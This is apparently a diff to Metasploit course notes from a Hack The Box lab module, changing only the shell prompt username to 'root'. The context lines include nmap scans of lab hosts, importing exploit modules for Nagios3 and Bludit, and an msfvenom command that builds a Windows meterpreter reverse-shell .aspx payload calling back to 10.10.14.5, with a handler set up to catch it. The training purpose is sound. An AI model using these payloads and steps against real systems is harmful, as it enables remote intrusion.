@@ -224,7 +224,7 @@ These are the base files for the Framework. The Data and Lib are the functioning
 The Modules detailed above are split into separate categories in this folder. We will go into detail about these in the next sections. They are contained in the following folders:
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/modules
+root@htb[/htb]$ ls /usr/share/metasploit-framework/modules
 
 auxiliary  encoders  evasion  exploits  nops  payloads  post
 ```
@@ -234,7 +234,7 @@ auxiliary  encoders  evasion  exploits  nops  payloads  post
 Plugins offer the pentester more flexibility when using the `msfconsole` since they can easily be manually or automatically loaded as needed to provide extra functionality and automation during our assessment.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
+root@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
 
 aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
 alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
@@ -251,7 +251,7 @@ ffautoregen.rb     nexpose.rb     socket_logger.rb
 Meterpreter functionality and other useful scripts.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
+root@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
 
 meterpreter  ps  resource  shell
 ```
@@ -261,7 +261,7 @@ meterpreter  ps  resource  shell
 Command-line utilities that can be called directly from the `msfconsole` menu.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
+root@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
 
 context  docs     hardware  modules   payloads
 dev      exploit  memdump   password  recon
@@ -572,7 +572,7 @@ To select our first module, we first need to find one. Let's suppose that we hav
 &#x20; Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -sV 10.10.10.40
+root@htb[/htb]$ nmap -sV 10.10.10.40
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
 Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
@@ -2118,7 +2118,7 @@ First, we must ensure that the PostgreSQL server is up and running on our host m
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo service postgresql status
+root@htb[/htb]$ sudo service postgresql status
 
 ● postgresql.service - PostgreSQL RDBMS
      Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
@@ -2136,7 +2136,7 @@ May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo systemctl start postgresql
+root@htb[/htb]$ sudo systemctl start postgresql
 ```
 
 After starting PostgreSQL, we need to create and initialize the MSF database with `msfdb init`.
@@ -2146,7 +2146,7 @@ After starting PostgreSQL, we need to create and initialize the MSF database wit
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfdb init
+root@htb[/htb]$ sudo msfdb init
 
 [i] Database already started
 [+] Creating database user 'msf'
@@ -2166,7 +2166,7 @@ Sometimes an error can occur if Metasploit is not up to date. This difference th
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfdb init
+root@htb[/htb]$ sudo msfdb init
 
 [i] Database already started
 [i] The database appears to be already configured, skipping initialization
@@ -2177,7 +2177,7 @@ If the initialization is skipped and Metasploit tells us that the database is al
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfdb status
+root@htb[/htb]$ sudo msfdb status
 
 ● postgresql.service - PostgreSQL RDBMS
      Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
@@ -2204,7 +2204,7 @@ If this error does not appear, which often happens after a fresh installation of
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfdb init
+root@htb[/htb]$ sudo msfdb init
 
 [+] Starting database
 [+] Creating database user 'msf'
@@ -2221,7 +2221,7 @@ After the database has been initialized, we can start `msfconsole` and connect t
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo msfdb run
+root@htb[/htb]$ sudo msfdb run
 
 [i] Database already started
                                                   
@@ -2261,10 +2261,10 @@ If, however, we already have the database configured and are not able to change 
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfdb reinit
-AbdulrahmanTamim@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
-AbdulrahmanTamim@htb[/htb]$ sudo service postgresql restart
-AbdulrahmanTamim@htb[/htb]$ msfconsole -q
+root@htb[/htb]$ msfdb reinit
+root@htb[/htb]$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
+root@htb[/htb]$ sudo service postgresql restart
+root@htb[/htb]$ msfconsole -q
 
 msf6 > db_status
 
@@ -2376,7 +2376,7 @@ Next, let us assume we want to import a `Nmap scan` of a host into our Database'
 &#x20; Databases
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat Target.nmap
+root@htb[/htb]$ cat Target.nmap
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
 Nmap scan report for 10.10.10.40
@@ -2740,7 +2740,7 @@ To start using a plugin, we will need to ensure it is installed in the correct d
 &#x20; Plugins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/plugins
+root@htb[/htb]$ ls /usr/share/metasploit-framework/plugins
 
 aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
 alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
@@ -2807,8 +2807,8 @@ For example, let us try installing [DarkOperator's Metasploit-Plugins](https://g
 &#x20; Plugins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
-AbdulrahmanTamim@htb[/htb]$ ls Metasploit-Plugins
+root@htb[/htb]$ git clone https://github.com/darkoperator/Metasploit-Plugins
+root@htb[/htb]$ ls Metasploit-Plugins
 
 aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
 alias.rb           komand.rb      pentest.rb           thread.rb
@@ -2828,7 +2828,7 @@ Here we can take the plugin `pentest.rb` as an example and copy it to `/usr/shar
 &#x20; Plugins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+root@htb[/htb]$ sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
 ```
 
 Afterward, launch `msfconsole` and check the plugin's installation by running the `load` command. After the plugin has been loaded, the `help menu` at the `msfconsole` is automatically extended by additional functions.
@@ -2838,7 +2838,7 @@ Afterward, launch `msfconsole` and check the plugin's installation by running th
 &#x20; Plugins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfconsole -q
+root@htb[/htb]$ msfconsole -q
 
 msf6 > load pentest
 
@@ -3691,7 +3691,7 @@ We can, however, find the exploit code [inside ExploitDB's entries](https://www.
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ searchsploit nagios3
+root@htb[/htb]$ searchsploit nagios3
 
 --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                               |  Path
@@ -3709,7 +3709,7 @@ Note that the hosted file terminations that end in `.rb` are Ruby scripts that m
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
+root@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"
 
 --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                               |  Path
@@ -3728,7 +3728,7 @@ We have to download the `.rb` file and place it in the correct directory. The de
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/
+root@htb[/htb]$ ls /usr/share/metasploit-framework/
 
 app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor
 config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts
@@ -3738,7 +3738,7 @@ data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc         
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls .msf4/
+root@htb[/htb]$ ls .msf4/
 
 history  local  logos  logs  loot  modules  plugins  store
 ```
@@ -3757,8 +3757,8 @@ For example:
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
-AbdulrahmanTamim@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
+root@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+root@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/
 ```
 
 **MSF - Loading Additional Modules**
@@ -3816,7 +3816,7 @@ We start by picking some exploit code to port over to Metasploit. In this exampl
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
+root@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
 
 bludit_upload_images_exec.rb
 ```
@@ -3824,7 +3824,7 @@ bludit_upload_images_exec.rb
 &#x20; Writing and Importing Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
+root@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
 ```
 
 At the beginning of the file we copied, which is where we will be filling in our information, we can notice the `include` statements at the beginning of the boilerplate module. These are the mixins mentioned in the `Plugins and Mixins` section, and we will need to change these to the appropriate ones for our module.
@@ -4085,7 +4085,7 @@ Suppose we are hypothetically allowed to call anything we want from the web serv
 &#x20; Introduction to MSFVenom
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
+root@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
 
 <SNIP>
 PORT   STATE SERVICE VERSION
@@ -4099,7 +4099,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 &#x20; Introduction to MSFVenom
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ftp 10.10.10.5
+root@htb[/htb]$ ftp 10.10.10.5
 
 Connected to 10.10.10.5.
 220 Microsoft FTP Service
@@ -4133,7 +4133,7 @@ Noticing the aspnet\_client, we realize that the box will be able to run `.aspx`
 &#x20; Introduction to MSFVenom
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+root@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
@@ -4145,7 +4145,7 @@ Final size of aspx file: 2819 bytes
 &#x20; Introduction to MSFVenom
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates
 ```
@@ -4157,7 +4157,7 @@ Now, we only need to navigate to `http://10.10.10.5/reverse_shell.aspx`, and it 
 &#x20; Introduction to MSFVenom
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfconsole -q 
+root@htb[/htb]$ msfconsole -q 
 
 msf6 > use multi/handler
 msf6 exploit(multi/handler) > show options
